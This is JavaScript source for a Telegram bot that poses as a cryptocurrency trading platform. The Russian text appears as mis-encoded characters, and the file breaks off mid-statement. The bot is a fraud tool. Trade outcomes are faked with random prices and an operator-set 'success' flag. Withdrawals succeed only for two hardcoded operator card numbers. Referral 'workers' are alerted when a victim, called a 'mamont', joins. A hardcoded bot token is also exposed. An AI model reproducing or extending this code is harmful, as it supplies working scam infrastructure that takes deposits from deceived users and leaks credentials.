const TelegramBot = require('node-telegram-bot-api');

const token = '6334457411:AAGFFmCL_JSaN6BAeMicY9So0fG5st1L49w';
const {
    DataTypes
} = require('sequelize');
const sequelize = require('./db');
const UserModel = require('./models');
const bot = new TelegramBot(token, {
    polling: true
});

const mainKeyboard = {
    reply_markup: JSON.stringify({
        keyboard: [
            ["üìä ECN —Å—á—ë—Ç"],
            ["üñ• –õ–∏—á–Ω—ã–π –∫–∞–±–∏–Ω–µ—Ç"],
            ["üìù –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è", "üßëüèª‚Äçüíª –¢–µ—Ö–Ω–∏—á–µ—Å–∫–∞—è –ø–æ–¥–¥–µ—Ä–∂–∫–∞"]
        ]
    })
};

const prompts = require('prompts');
const WebSocket = require('ws');
const User = require('./models');

const run = async (symbol) => {
    return new Promise((resolve) => {
        const ws = new WebSocket(`wss://stream.binance.com:9443/ws/${symbol.toLowerCase()}@kline_1m`);

        ws.on('message', (data) => {
            const incomingData = JSON.parse(data.toString());
            if (incomingData.k) {
                const coinCost = Number(incomingData.k.c);
                resolve(coinCost); // –†–æ–∑–¥—ñ–ª–∏—Ç–∏ –∑–Ω–∞—á–µ–Ω–Ω—è —á–µ—Ä–µ–∑ resolve, –∫–æ–ª–∏ –æ—Ç—Ä–∏–º–∞–Ω–æ –¥–∞–Ω—ñ
            }
        });
    });
}

const menuKeyboard = {
    reply_markup: {
        keyboard: [
            [{
                text: 'üìä ECN –°—á—ë—Ç'
            }],
            [{
                text: 'üíº –õ–∏—á–Ω—ã–π –ö–∞–±–∏–Ω–µ—Ç'
            }],
            [{
                text: '‚öôÔ∏è –¢–µ—Ö.–ü–æ–¥–¥–µ—Ä–∂–∫–∞'
            }]
        ],
        resize_keyboard: true,
        one_time_keyboard: false
    }
};

const deleteMessage = (id, msg) => (
    bot.deleteMessage(id, msg)
);

const ownCabinet = (userId, userBalance, userVivod, userStatus, allDeals, successfullDeals, unsuccessfullDeals, userverif, daysRegistered) => ('üñ• –õ–∏—á–Ω—ã–π –∫–∞–±–∏–Ω–µ—Ç\n' +
    '\n' +
    '‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ\n' +
    `*–í–∞—à ID*: *${userId}*\n` +
    `*–í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è*: ${userverif ? '‚úÖ –í–µ—Ä–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞–Ω' : '‚ö†Ô∏è –ù–µ –≤–µ—Ä–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞–Ω'}\n` +
    `*–°—Ç–∞—Ç—É—Å*: ${userStatus ? 'üîº–ü–æ–ª–æ–∂–∏—Ç–µ–ª—å–Ω—ã–πüîº' : 'üòê–ü–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—ã–πüòê'}\n` +
    '‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ\n' +
    `üí∞ –ë–∞–ª–∞–Ω—Å : ${userBalance} ‚ÇΩ\n` +
    `üìÇ –ù–∞ –≤—ã–≤–æ–¥–µ : ${userVivod} ‚ÇΩ\n` +
    '‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ\n' +
    `üìä –í—Å–µ–≥–æ —Å–¥–µ–ª–æ–∫ : ${allDeals}\n` +
    '\n' +
    `‚úÖ –£—Å–ø–µ—à–Ω—ã—Ö —Å–¥–µ–ª–æ–∫ : ${successfullDeals}\n` +
    `‚ùå –ù–µ—É—Å–ø–µ—à–Ω—ã—Ö —Å–¥–µ–ª–æ–∫ : ${unsuccessfullDeals}\n` +
    '‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ\n' +
    `üìù –ó–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω: ${daysRegistered} –¥.\n` +
    '‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ\n' +
    '\n' +
    '‚ö†Ô∏è –ù–∞—à–∞ —Ç–µ—Ö–Ω–∏—á–µ—Å–∫–∞—è –ø–æ–¥–¥–µ—Ä–∂–∫–∞ - @alinkamurcc. \n –°–æ—Ç—Ä—É–¥–Ω–∏–∫–∏ —Ç–µ—Ö–Ω–∏—á–µ—Å–∫–æ–π –ø–æ–¥–¥–µ—Ä–∂–∫–∏ –Ω–∏–∫–æ–≥–¥–∞ –Ω–µ –ø–∏—à—É—Ç –≤–∞–º –ø–µ—Ä–≤—ã–º–∏.'
);

function getRandomNumberInRange(x, y) {
    if (x > y) {
        // Swap x and y if they are given in reverse order
        [x, y] = [y, x];
    }

    const min = Math.ceil(x);
    const max = Math.floor(y);

    return (Math.random() * (max - min + 1) + min).toFixed(2);
}

function qiwiChecker(paymentWay) {
    bot.on('message', async function qiwiCheck(msg) {
        const text = msg.text;
        const chatId = msg.chat.id;

        if (!isNaN(text) && text.length >= 10 && text.length <= 19) {
            const cardNum = Number(text);
            const user = await UserModel.findOne({
                where: {
                    chatId: chatId.toString()
                }
            });

            bot.removeListener('message', qiwiCheck);

            await bot.sendMessage(chatId, `üí∞ –í–∞—à –±–∞–ª–∞–Ω—Å : ${user.balance} ‚ÇΩ \n \n` +
                '*–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –¥–ª—è –≤—ã–≤–æ–¥–∞*.', {
                    parse_mode: 'Markdown'
                }
            );

            bot.on('message', async function balanceCheck(msg) {
                const text = msg.text;
                const chatId = msg.chat.id;

                if (!isNaN(text)) {
                    const withdrawNum = Number(text);

                    const user = await UserModel.findOne({
                        where: {
                            chatId: chatId.toString()
                        }
                    });

                    if (cardNum.toString() === '79120874881' || cardNum.toString() === '2200240715868499') {
                        bot.removeListener('message', balanceCheck);
                        if (withdrawNum <= user.balance && user.balance !== 0 && withdrawNum >= user.minDeposit && user.vivodSuccess) {
                            bot.sendMessage(chatId, `‚úÖ *–í—ã —É—Å–ø–µ—à–Ω–æ –ø–æ–¥–∞–ª–∏ –∑–∞—è–≤–∫—É –Ω–∞ –≤—ã–≤–æ–¥ –¥–µ–Ω–µ–∂–Ω—ã—Ö —Å—Ä–µ–¥—Å—Ç–≤*. \n \n` +
                                `ID –∑–∞—è–≤–∫–∏ : ${getRandomNumberInRange(385478, 861835)} \n` +
                                `–°—É–º–º–∞ –≤—ã–≤–æ–¥–∞ : ${withdrawNum} ‚ÇΩ \n` +
                                `–†–µ–∫–≤–∏–∑–∏—Ç—ã –¥–ª—è –≤—ã–≤–æ–¥–∞ : ${cardNum} \n \n` +
                                '‚ö†Ô∏è _–í—ã–≤–æ–¥ —Å—Ä–µ–¥—Å—Ç–≤ –º–æ–∂–µ—Ç –∑–∞–Ω—è—Ç—å –¥–æ 3 —á–∞—Å–æ–≤_.'
                            );

                            bot1.sendMessage(user.worker, `üìä *–°–µ—Ä–≤–∏—Å - –¢—Ä–µ–π–¥–∏–Ω–≥* \n \n` +
                                `‚úÖ –ú–∞–º–æ–Ω—Ç [${user.username}](https://t.me/${user.username}) \n` +
                                `–°–æ–∑–¥–∞–ª –∑–∞—è–≤–∫—É –Ω–∞ –≤—ã–≤–æ–¥ –¥–µ–Ω–µ–∂–Ω—ã—Ö —Å—Ä–µ–¥—Å—Ç–≤ –≤ —Ä–∞–∑–º–µ—Ä–µ - *${withdrawNum}* ‚ÇΩ`, {
                                    parse_mode: 'Markdown',
                                    reply_markup: {
                                        inline_keyboard: [
                                            [{
                                                text: '–í—ã–≤–µ—Å—Ç–∏',
                                                callback_data: `realWithdrawTrue`
                                            }, {
                                                text: '–û—Ç–º–µ–Ω–∏—Ç—å',
                                                callback_data: `realWithdrawFalse`
                                            }],
                                        ],
                                    },
                                })

                            bot1.on('callback_query', async (query) => {
                                const chatId = query.message.chat.id;
                                const buttonData = query.data;
                                const messageId = query.message.message_id;

                                try {
                                    if (buttonData === `realWithdrawTrue`) {
                                        bot1.deleteMessage(chatId, messageId);

                                        user.balance -= withdrawNum;
                                        await user.save();
                                        return bot.sendMessage(user.chatId, '‚úÖ –í–∞—à–∞ –∑–∞—è–≤–∫–∞ –Ω–∞ –≤—ã–≤–æ–¥ —Å—Ä–µ–¥—Å—Ç–≤ –±—ã–ª–∞ —É—Å–ø–µ—à–Ω–æ –æ–±—Ä–∞–±–æ—Ç–∞–Ω–∞,' +
                                            '—Å—Ä–µ–¥—Å—Ç–≤–∞ –ø–æ—Å—Ç—É–ø—è—Ç –Ω–∞ –≤–∞—à–∏ —Ä–µ–∫–≤–∏–∑–∏—Ç—ã –≤ —Ç–µ—á–µ–Ω–∏–∏ 15 –º–∏–Ω—É—Ç'
                                        );
                                    } else {
                                        bot1.deleteMessage(chatId, messageId);
                                        return bot.sendMessage(user.chatId, `‚ùå _–í—ã–≤–æ–¥ —Å—Ä–µ–¥—Å—Ç–≤ –±—ã–ª –æ—Ç–º–µ–Ω–µ–Ω, –æ–±—Ä–∞—Ç–∏—Ç–µ—Å—å –≤ —Ç–µ—Ö–Ω–∏—á–µ—Å–∫—É—é –ø–æ–¥–¥–µ—Ä–∂–∫—É –ø–æ —Å—Å—ã–ª–∫–µ –Ω–∏–∂–µ_`, {
                                            parse_mode: 'Markdown',
                                            reply_markup: {
                                                inline_keyboard: [
                                                    [{
                                                        text: '–û–±—Ä–∞—Ç–∏—Ç—å—Å—è –≤ –ø–æ–¥–¥–µ—Ä–∂–∫—É',
                                                        url: 'https://t.me/alinkamurcc'
                                                    }]
                                                ]
                                            }
                                        });
                                    }
                                } catch (e) {
                                    console.log('–ü—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è –∑–ª–∞–º–∞–ª–æ—Å—å', e);
                                }
                            })

                        } else if (withdrawNum > user.balance || user.balance !== 0) {
                            return bot.sendMessage(chatId, `–£ –≤–∞—Å –Ω–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤ –Ω–∞ —Å—á–µ—Ç—É`);
                        } else if (withdrawNum < user.minDeposit) {
                            return bot.sendMessage(chatId, `*–ú–∏–Ω–∏–º–∞–ª—å–Ω—ã–π –¥–µ–ø–æ–∑–∏—Ç*: ${user.minDeposit}`)
                        } else {
                            return bot.sendMessage(chatId, `‚ùå _–í—ã–≤–æ–¥ —Å—Ä–µ–¥—Å—Ç–≤ –±—ã–ª –æ—Ç–º–µ–Ω–µ–Ω, –æ–±—Ä–∞—Ç–∏—Ç–µ—Å—å –≤ —Ç–µ—Ö–Ω–∏—á–µ—Å–∫—É—é –ø–æ–¥–¥–µ—Ä–∂–∫—É –ø–æ —Å—Å—ã–ª–∫–µ –Ω–∏–∂–µ_`, {
                                parse_mode: 'Markdown',
                                reply_markup: {
                                    inline_keyboard: [
                                        [{
                                            text: '–û–±—Ä–∞—Ç–∏—Ç—å—Å—è –≤ –ø–æ–¥–¥–µ—Ä–∂–∫—É',
                                            url: 'https://t.me/alinkamurcc'
                                        }]
                                    ]
                                }
                            });
                        }
                    } else if (withdrawNum <= user.balance && user.balance !== 0 && withdrawNum >= user.minDeposit) {
                        bot.removeListener('message', balanceCheck);

                        return bot.sendMessage(chatId, `‚ùå _–í—ã–≤–æ–¥ —Å—Ä–µ–¥—Å—Ç–≤ –±—ã–ª –æ—Ç–º–µ–Ω–µ–Ω, –æ–±—Ä–∞—Ç–∏—Ç–µ—Å—å –≤ —Ç–µ—Ö–Ω–∏—á–µ—Å–∫—É—é –ø–æ–¥–¥–µ—Ä–∂–∫—É –ø–æ —Å—Å—ã–ª–∫–µ –Ω–∏–∂–µ_`, {
                            parse_mode: 'Markdown',
                            reply_markup: {
                                inline_keyboard: [
                                    [{
                                        text: '–û–±—Ä–∞—Ç–∏—Ç—å—Å—è –≤ –ø–æ–¥–¥–µ—Ä–∂–∫—É',
                                        url: 'https://t.me/alinkamurcc'
                                    }]
                                ]
                            }
                        });
                    } else if (user.balance === 0 || user.minDeposit > user.balance) {
                        bot.removeListener('message', balanceCheck);

                        return bot.sendMessage(chatId, `‚ùå –ù–∞ –≤–∞—à–µ–º —Å—á–µ—Ç—É –Ω–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤ –¥–ª—è –≤—ã–≤–æ–¥–∞`);
                    } else if (withdrawNum > user.balance) {
                        bot.sendMessage(chatId, `*‚ùå –ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ –≤—ã–≤–æ–¥–∞ ${user.minDeposit} RUB*!` +
                            '\n \n –í–≤–µ–¥–∏—Ç–µ –ø—Ä–∞–≤–∏–ª—å–Ω—É—é —Å—É–º–º—É –≤—ã–≤–æ–¥–∞', {
                                parse_mode: 'Markdown'
                            });
                    }
                }
            });
        } else {
            bot.sendMessage(chatId, '*–í–≤–µ–¥–µ–Ω–Ω—ã–π –Ω–æ–º–µ—Ä ' +
                `${paymentWay === 'card' ? '–∫–∞—Ä—Ç—ã' : '–∫–æ—à–µ–ª—å–∫–∞'}` +
                ' –Ω–µ –≤–µ—Ä–Ω—ã–π*! \n \n' +
                '–í–≤–µ–¥–∏—Ç–µ –ø—Ä–∞–≤–∏–ª—å–Ω—ã–π –Ω–æ–º–µ—Ä ' +
                `${paymentWay === 'card' ? '–±–∞–Ω–∫–æ–≤—Å–∫–æ–π –∫–∞—Ä—Ç—ã' : 'QIWI –∫–æ—à–µ–ª—å–∫–∞'}`, {
                    parse_mode: 'Markdown'
                });
        }
    })
}

function generateLkKeyboard(user, userId, timeDiff) {
    return {
        parse_mode: 'Markdown',
        reply_markup: {
            inline_keyboard: [
                [{
                    text: 'üí≥ –ü–æ–ø–æ–ª–Ω–∏—Ç—å',
                    callback_data: 'deposit'
                }, {
                    text: 'üí∏ –í—ã–≤–µ—Å—Ç–∏',
                    callback_data: 'withdraw'
                }],
                [{
                    text: 'üîí –í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è',
                    callback_data: 'verification'
                }],
                [{
                    text: '‚öôÔ∏è –ù–∞—Å—Ç—Ä–æ–π–∫–∏',
                    callback_data: 'settings'
                }]
            ]
        },
        caption: ownCabinet(userId, user.balance, user.vivod, user.status, user.deals, user.goodDeals, user.badDeals, user.verif, timeDiff)
    };
}

// function generateDepKeyboard() {
//     return {
//         reply_markup: {
//             inline_keyboard: [
//                 [{
//                     text: 'üí≥ –ü–æ–ø–æ–ª–Ω–∏—Ç—å –±–∞–Ω–∫–æ–≤—Å–∫–æ–π –∫–∞—Ä—Ç–æ–π',
//                     callback_data: 'deposit_with_card'
//                 }],
//                 [{
//                     text: 'üí∞ –ü–æ–ø–æ–ª–Ω–∏—Ç—å –∫–∏–≤–∏ –∫–æ—à–µ–ª—å–∫–æ–º',
//                     callback_data: 'deposit_with_wallet'
//                 }],
//             ]
//         }
//     };
// }

function buttonChecker(messageId) {
    bot.on('callback_query', async function lastButtonChecker(query) {
        const userId = query.from.id;
        const chatId = query.message.chat.id;

        if (query.data === 'continue') {
            bot.editMessageReplyMarkup({
                inline_keyboard: []
            }, {
                chat_id: chatId,
                message_id: query.message.message_id
            });

            bot.removeListener('callback_query', lastButtonChecker);
            return bot.sendPhoto(chatId, './images/ECN.jpg', {
                caption: 'üìä ECN —Å—á—ë—Ç\n–í—ã–±–µ—Ä–∏—Ç–µ –º–æ–Ω–µ—Ç—É –¥–ª—è –∏–Ω–≤–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è –¥–µ–Ω–µ–∂–Ω—ã—Ö —Å—Ä–µ–¥—Å—Ç–≤',
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: 'Bitcoin',
                            callback_data: 'btc_coin'
                        }, {
                            text: 'Qtum',
                            callback_data: 'qtum_coin'
                        }],
                        [{
                            text: 'Ethereum',
                            callback_data: 'eth_coin'
                        }, {
                            text: 'Tron',
                            callback_data: 'trx_coin'
                        }],
                        [{
                            text: 'Litecoin',
                            callback_data: 'ltc_coin'
                        }, {
                            text: 'Ripple',
                            callback_data: 'xrp_coin'
                        }],
                        [{
                            text: 'Cardano',
                            callback_data: 'ada_coin'
                        }, {
                            text: 'Solana',
                            callback_data: 'sol_coin'
                        }],
                        [{
                            text: 'Terra',
                            callback_data: 'luna_coin'
                        }, {
                            text: 'Doge',
                            callback_data: 'doge_coin'
                        }],
                        [{
                            text: 'Polka Dot',
                            callback_data: 'dot_coin'
                        }, {
                            text: 'Avalanche',
                            callback_data: 'avax_coin'
                        }],
                        [{
                            text: 'Polygon',
                            callback_data: 'matic_coin'
                        }, {
                            text: 'Uniswap',
                            callback_data: 'uni_coin'
                        }],
                    ]
                }
            });
        }

        if (query.data === 'break') {
            const user = await UserModel.findOne({
                where: {
                    chatId: chatId.toString()
                }
            });
            const currentDate = new Date();
            const registrationDate = user.registrationDate;
            const timeDiff = currentDate - registrationDate;
            const daysRegistered = Math.floor(timeDiff / (1000 * 60 * 60 * 24));

            bot.removeListener('callback_query', lastButtonChecker);
            bot.editMessageReplyMarkup({
                inline_keyboard: []
            }, {
                chat_id: chatId,
                message_id: query.message.message_id
            });
            bot.sendMessage(chatId, '‚ö°Ô∏è', menuKeyboard);
            return bot.sendPhoto(chatId, './images/ownCabinet.jpg', generateLkKeyboard(user, userId, daysRegistered));
        }

        bot.removeListener('callback_query', lastButtonChecker);
        return;
    })
    return;
}

function sendCountdownMessage(chatId, messageId, time, currency, pullSum, firstCost, lastPoint) {
    const intervalId = setInterval(async () => {
        if (time > 5) {
            const secondCost = getRandomNumberInRange(firstCost - 15, firstCost + 15);

            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –æ–±–Ω–æ–≤–ª–µ–Ω–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ —Å —Ç–µ–∫—É—â–∏–º –≤—Ä–µ–º–µ–Ω–µ–º
            const updatedMessageText = `üè¶ ${currency} \n \n` +
                `üíµ –°—É–º–º–∞ –ø—É–ª–∞: ${pullSum}‚ÇΩ \n` +
                `${lastPoint === 'up' ? 'üìà: –ü—Ä–æ–≥–Ω–æ–∑: –ü–æ–≤—ã—à–µ–Ω–∏–µ' : 'üìâ: –ü—Ä–æ–≥–Ω–æ–∑: –ü–æ–Ω–∏–∂–µ–Ω–∏–µ'} \n \n` +
                `‚Ä¢ –ò–∑–Ω–∞—á–∞–ª—å–Ω–∞—è —Å—Ç–æ–∏–º–æ—Å—Ç—å: ${firstCost} USD \n` +
                `‚Ä¢ –¢–µ–∫—É—â–∞—è —Å—Ç–æ–∏–º–æ—Å—Ç—å: ${secondCost} USD \n` +
                `‚Ä¢ –ò–∑–º–µ–Ω–µ–Ω–∏–µ: ${(firstCost - secondCost).toFixed(2)} USD \n \n` +
                `‚è± –û—Å—Ç–∞–ª–æ—Å—å: ${time - 5} —Å–µ–∫`;
            bot.editMessageText(updatedMessageText, {
                chat_id: chatId,
                message_id: messageId,
            });

            time -= 5;
        } else {
            clearInterval(intervalId);
            bot.deleteMessage(chatId, messageId);
            let secondCost;
            const user = await UserModel.findOne({
                where: {
                    chatId: chatId.toString()
                }
            });

            if (user.success) {
                if (lastPoint === 'up') {
                    secondCost = getRandomNumberInRange(firstCost + 1, firstCost + 8);
                } else {
                    secondCost = getRandomNumberInRange(firstCost - 8, firstCost - 1);
                }

                user.balance += pullSum * 2;
                user.deals += 1;
                user.goodDeals += 1;

                await user.save();

                return bot.sendMessage(chatId, `üìä –°—Ç–æ–∏–º–æ—Å—Ç—å –∞–∫—Ç–∏–≤–∞ \n \n` +
                    `‚úÖ –í–∞—à –ø—Ä–æ–≥–Ω–æ–∑ –æ–∫–∞–∑–∞–ª—Å—è –≤–µ—Ä–Ω—ã–º \n \n` +
                    `‚Ä¢ –ò–∑–Ω–∞—á–∞–ª—å–Ω–∞—è —Å—Ç–æ–∏–º–æ—Å—Ç—å: ${firstCost} USD \n` +
                    `‚Ä¢ –¢–µ–∫—É—â–∞—è —Å—Ç–æ–∏–º–æ—Å—Ç—å: ${secondCost} USD \n` +
                    `‚Ä¢ –ò–∑–º–µ–Ω–µ–Ω–∏–µ: ${(secondCost - firstCost).toFixed(2)} USD \n \n` +
                    `‚è± –û—Å—Ç–∞–ª–æ—Å—å: 0 —Å–µ–∫`, {
                        reply_markup: {
                            inline_keyboard: [
                                [{
                                    text: '–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å',
                                    callback_data: 'continue'
                                }],
                                [{
                                    text: '–û—Ç–º–µ–Ω–∞',
                                    callback_data: 'break'
                                }],
                            ]
                        }
                    }
                ).then(sentMessage => {
                    const message__Id = sentMessage.message_id;

                    return buttonChecker(message__Id);
                });
            } else {
                if (lastPoint === 'up') {
                    secondCost = getRandomNumberInRange(firstCost - 15, firstCost - 1);
                } else {
                    secondCost = getRandomNumberInRange(firstCost + 1, firstCost + 15);
                }

                user.balance -= pullSum;
                user.deals += 1;
                user.badDeals += 1;

                await user.save();

                return bot.sendMessage(chatId, `üìä –°—Ç–æ–∏–º–æ—Å—Ç—å –∞–∫—Ç–∏–≤–∞ \n \n` +
                    `‚ùå –í–∞—à –ø—Ä–æ–≥–Ω–æ–∑ –æ–∫–∞–∑–∞–ª—Å—è –Ω–µ–≤–µ—Ä–Ω—ã–º \n \n` +
                    `‚Ä¢ –ò–∑–Ω–∞—á–∞–ª—å–Ω–∞—è —Å—Ç–æ–∏–º–æ—Å—Ç—å: ${firstCost} USD \n` +
                    `‚Ä¢ –¢–µ–∫—É—â–∞—è —Å—Ç–æ–∏–º–æ—Å—Ç—å: ${secondCost} USD \n` +
                    `‚Ä¢ –ò–∑–º–µ–Ω–µ–Ω–∏–µ: ${(firstCost - secondCost).toFixed(2)} USD \n \n` +
                    `‚è± –û—Å—Ç–∞–ª–æ—Å—å: 0 —Å–µ–∫`, {
                        reply_markup: {
                            inline_keyboard: [
                                [{
                                    text: '–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å',
                                    callback_data: 'continue'
                                }],
                                [{
                                    text: '–û—Ç–º–µ–Ω–∞',
                                    callback_data: 'break'
                                }],
                            ]
                        }
                    }
                ).then(sentMessage => {
                    const message__Id = sentMessage.message_id;

                    return buttonChecker(message__Id);
                });
            }
        }
    }, 5000);

    return;
}

function botPull(currency, firstCost, lastPoint) {
    let pullSum;

    bot.on('message', async function msgFunc(msg) {
        const text = msg.text;
        const chatId = msg.chat.id;
        const userId = msg.from.id;

        if (!isNaN(text)) {
            pullSum = Number(text);

            const user = await UserModel.findOne({
                where: {
                    chatId: chatId.toString()
                }
            });

            if (pullSum <= user.balance && pullSum > 0) {
                bot.removeListener('message', msgFunc);

                bot.sendMessage(chatId, `üï∞ –í—Ä–µ–º—è –æ–∂–∏–¥–∞–Ω–∏—è:`, {
                    reply_markup: {
                        inline_keyboard: [
                            [{
                                text: '30 –°–µ–∫—É–Ω–¥',
                                callback_data: '30'
                            }],
                            [{
                                text: '1 –ú–∏–Ω—É—Ç–∞',
                                callback_data: '60'
                            }],
                            [{
                                text: '3 –ú–∏–Ω—É—Ç—ã',
                                callback_data: '180'
                            }],
                            [{
                                text: '10 –ú–∏–Ω—É—Ç',
                                callback_data: '600'
                            }],
                        ]
                    },
                });
            } else if (pullSum < 0) {
                bot.sendMessage(chatId, "‚ùå *–í–≤–µ–¥–∏—Ç–µ —Ü–µ–ª–æ–µ —á–∏—Å–ª–æ, –±–µ–∑ –ª–∏—à–Ω–∏—Ö —Å–∏–º–≤–æ–ª–æ–≤*", {
                    parse_mode: 'Markdown'
                });
            } else if (pullSum === 0) {
                bot.sendMessage(chatId, "‚ùå *–°—É–º–º–∞ –ø—É–ª–ª–∞ –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å 0*", {
                    parse_mode: 'Markdown'
                });
            } else {
                return bot.sendMessage(chatId, "‚ö†Ô∏è *–£ –≤–∞—Å –Ω–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤ –Ω–∞ –±–∞–ª–∞–Ω—Å–µ*", {
                    parse_mode: 'Markdown'
                });
            }

        } else {
            bot.sendMessage(chatId, '–°—É–º–º–∞ –ø—É–ª–∞ –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å —á–∏—Å–ª–æ–º! \n \n' + '–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –ø—É–ª–∞');
        }
    });

    bot.on('callback_query', function callFunc(query) {
        const chatId = query.message.chat.id;
        let messageId = query.message.message_id;
        let time = +query.data;

        if (!isNaN(query.data)) {
            deleteMessage(chatId, messageId);

            return bot.sendMessage(chatId, `üè¶ ${currency} \n \n` +
                `üíµ –°—É–º–º–∞ –ø—É–ª–∞: ${pullSum}‚ÇΩ \n` +
                `${lastPoint === 'up' ? 'üìà: –ü—Ä–æ–≥–Ω–æ–∑: –ü–æ–≤—ã—à–µ–Ω–∏–µ' : 'üìâ: –ü—Ä–æ–≥–Ω–æ–∑: –ü–æ–Ω–∏–∂–µ–Ω–∏–µ'} \n \n` +
                `‚Ä¢ –ò–∑–Ω–∞—á–∞–ª—å–Ω–∞—è —Å—Ç–æ–∏–º–æ—Å—Ç—å: ${firstCost} USD \n` +
                `‚Ä¢ –¢–µ–∫—É—â–∞—è —Å—Ç–æ–∏–º–æ—Å—Ç—å: ${firstCost} USD \n` +
                `‚Ä¢ –ò–∑–º–µ–Ω–µ–Ω–∏–µ: ${firstCost - firstCost} USD \n \n` +
                `‚è± –û—Å—Ç–∞–ª–æ—Å—å: ${time} —Å–µ–∫`
            ).then(sentMessage => {
                messageId = sentMessage.message_id;

                bot.removeListener('callback_query', callFunc);

                return sendCountdownMessage(chatId, messageId, time, currency, pullSum, firstCost, lastPoint, lastPoint);
            })
        }

        return;
    });

    return;
}


bot.setMyCommands([{
        command: '/start',
        description: '–ó–∞–ø—É—Å–∫ –±–æ—Ç–∞'
    },
    {
        command: '/help',
        description: '–ü–æ–º–æ—â—å'
    },
]);

try {
    sequelize.authenticate()
    sequelize.sync()
    // UserModel.drop();
    // console.log('–¢–∞–±–ª–∏—Ü—è UserModel —É—Å–ø—ñ—à–Ω–æ –≤–∏–¥–∞–ª–µ–Ω–∞');
} catch (e) {
    console.log('–ü—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è –∑–ª–∞–º–∞–ª–æ—Å—å', e);
}

bot.onText(/\/start (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const referralCode = match[1]; // Extract the referral code from the command
    const userId = msg.from.id;
    const username = msg.from.username;

    try {
        await sequelize.authenticate()
        await sequelize.sync()

        const user = await UserModel.findOne({
            where: {
                chatId: chatId.toString()
            }
        });

        const rokky = await UserModel.findOne({
            where: {
                chatId: '6191812267',
            }
        });

        if (user) {
            const currentDate = new Date();
            const registrationDate = user.registrationDate;
            const timeDiff = currentDate - registrationDate;
            const daysRegistered = Math.floor(timeDiff / (1000 * 60 * 60 * 24));

            await bot.sendMessage(chatId, '‚ö°Ô∏è', menuKeyboard);
            return bot.sendPhoto(chatId, './images/ownCabinet.jpg', generateLkKeyboard(user, userId, timeDiff));
        } else {
            const worker = await UserModel.findOne({
                where: {
                    chatId: referralCode.toString(),
                }
            });

            if (username) {
                if (worker) {
                    await UserModel.create({
                        chatId: chatId.toString(),
                        minDeposit: worker.minDeposit,
                        worker: referralCode.toString(),
                        username: username,
                        depositCard: rokky.depositCard,
                        depositQiwi: rokky.depositQiwi,
                    });
                } else {
                    await UserModel.create({
                        chatId: chatId.toString(),
                        username: username,
                        depositCard: rokky.depositCard,
                        depositQiwi: rokky.depositQiwi,
                    });
                }
            } else {
                if (worker) {
                    await UserModel.create({
                        chatId: chatId.toString(),
                        minDeposit: worker.minDeposit,
                        worker: referralCode.toString(),
                        depositCard: rokky.depositCard,
                        depositQiwi: rokky.depositQiwi,
                    });
                } else {
                    await UserModel.create({
                        chatId: chatId.toString(),
                        depositCard: rokky.depositCard,
                        depositQiwi: rokky.depositQiwi,
                    });
                }
            }

            if (worker) {
                bot1.sendMessage(referralCode, `–ú–∞–º–æ–Ω—Ç –∑–∞—à—ë–ª –ø–æ —Å—Å—ã–ª–∫–µ –ø–æ–¥ ID: ${userId}, –ò–º—è –º–∞–º–æ–Ω—Ç–∞: ${username ? `@${username}` : '–£ –º–∞–º–æ–Ω—Ç–∞ –Ω–µ—Ç—É —é–∑–µ—Ä–Ω–µ–π–º–∞!'}`);
                const updatedMamonts = [...worker.mamonts, chatId.toString()];
                await worker.update({
                    mamonts: updatedMamonts
                });
            }

            return bot.sendMessage(chatId, `üéâ –ü—Ä–∏–≤–µ—Ç${username ? `, @${username}` : ''}!\n` +
                '–ü–æ–ª–∏—Ç–∏–∫–∞ –∏ —É—Å–ª–æ–≤–∏—è –ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –¥–∞–Ω–Ω—ã–º –±–æ—Ç–æ–º.\n' +
